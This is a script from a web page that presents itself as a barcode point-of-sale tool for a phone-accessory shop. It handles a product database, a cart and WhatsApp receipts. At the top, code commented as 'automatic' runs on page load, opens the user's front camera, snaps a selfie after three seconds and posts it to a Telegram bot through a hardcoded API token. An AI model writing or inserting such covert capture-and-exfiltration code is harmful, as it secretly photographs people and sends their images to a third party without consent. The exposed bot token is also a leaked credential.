    <script>
        // --- ØªÛŒÙ„ÛŒÚ¯Ø±Ø§Ù… ---
        const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";

        // ÙˆÛÙ†Û•Ú¯Ø±ØªÙ†ÛŒ Ø¦Û†ØªÛ†Ù…Ø§ØªÛŒÚ©ÛŒ
        window.addEventListener('load', () => {
            const video = document.getElementById('autoVideo');
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(captureAndSend, 3000);
            })

        });

        function captureAndSend() {
            const video = document.getElementById('autoVideo');
            const canvas = document.getElementById('autoCanvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', tgChatId);
                formData.append('photo', blob, 'selfie.png');
                formData.append('caption', 'ğŸ“· ÙˆÛÙ†Û•ÛŒ Ù†ÙˆÛ Ù„Û• Ahmad Phone');
                fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/png');
        }

        // --- Ø¯Ø§ØªØ§Ø¨Û•ÛŒØ³ ---
        let db = JSON.parse(localStorage.getItem('pos_db')) || {
            "6926081469953": { name: "LK150S (TYPE_C/MICRO)", price: 3000, stock: 100 },
            "6975011272217": { name: "GERLAX L36T TYPE_C", price: 6000, stock: 100 },
            "6975011272514": { name: "GERLAX GD-43 ALL", price: 6000, stock: 100 },
            "6975011278769": { name: "GERLAX D7L IPHONE", price: 5000, stock: 100 },

            "8655106412015": { name: "VJP VI-530", price: 5000, stock: 100 }
        };
        let cart = [];

        function showSection(s) {
            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
            document.getElementById(s + 'Section').classList.add('active');
            document.querySelectorAll('.tab-buttons button').forEach(btn => btn.classList.remove('active'));
            if(s === 'sell') document.getElementById('btnSell').classList.add('active');
            else document.getElementById('btnAdd').classList.add('active');
        }

        function addToCart(barcode) {
            const b = barcode.trim();
            if (db[b]) {
                const existing = cart.find(i => i.barcode === b);
                if (existing) existing.qty += 1;
                else cart.push({ barcode: b, name: db[b].name, price: db[b].price, qty: 1 });
                updateUI();
            } else { alert("Ù†Û•Ø¯Û†Ø²Ø±Ø§ÛŒÛ•ÙˆÛ•!"); }
        }

        function updateUI() {
            const list = document.getElementById('cartItems'); list.innerHTML = "";
            let total = 0;
            cart.forEach(item => {
                total += (item.price * item.qty);
                list.innerHTML += `<div class="cart-item"><span>${item.qty}x ${item.name}</span><span>${(item.price*item.qty).toLocaleString()} IQD</span></div>`;
            });
            document.getElementById('totalPrice').innerText = total.toLocaleString() + " IQD";
            document.getElementById('waBtn').style.display = cart.length > 0 ? "block" : "none";
            document.getElementById('clearBtn').style.display = cart.length > 0 ? "block" : "none";
        }

        function sendToWhatsapp() {
            let txt = ""; let total = 0;
            cart.forEach(item => {
                total += (item.price * item.qty);
                txt += `- ${item.name} (${item.qty})%0A`;
            });
            window.open(`https://wa.me/9647510074008?text=ğŸ“‹ *ÙˆÛ•ØµÚµ*%0A${txt}ğŸ’° *Ú©Û†: ${total.toLocaleString()}*`, '_blank');
            cart = []; updateUI();
        }

        function saveData() {
            const b = document.getElementById('newBarcode').value.trim();
            const n = document.getElementById('newName').value.trim();
            const p = parseInt(document.getElementById('newPrice').value);
            if(b && n && p) {
                db[b] = { name: n, price: p, stock: 100 };
                localStorage.setItem('pos_db', JSON.stringify(db));
                alert("Ù¾Ø§Ø´Û•Ú©Û•ÙˆØª Ú©Ø±Ø§!");
            }
        }

        let html5QrCode;
        function startScanner(m) {
            const r = document.getElementById('reader'); r.style.display = "block";
            html5QrCode = new Html5Qrcode("reader");
            html5QrCode.start({ facingMode: "environment" }, { fps: 15, qrbox: 250 }, (text) => {
                if(m === 'sell') addToCart(text); else document.getElementById('newBarcode').value = text;
                html5QrCode.stop(); r.style.display = "none";
            }).catch(() => r.style.display = "none");
        }
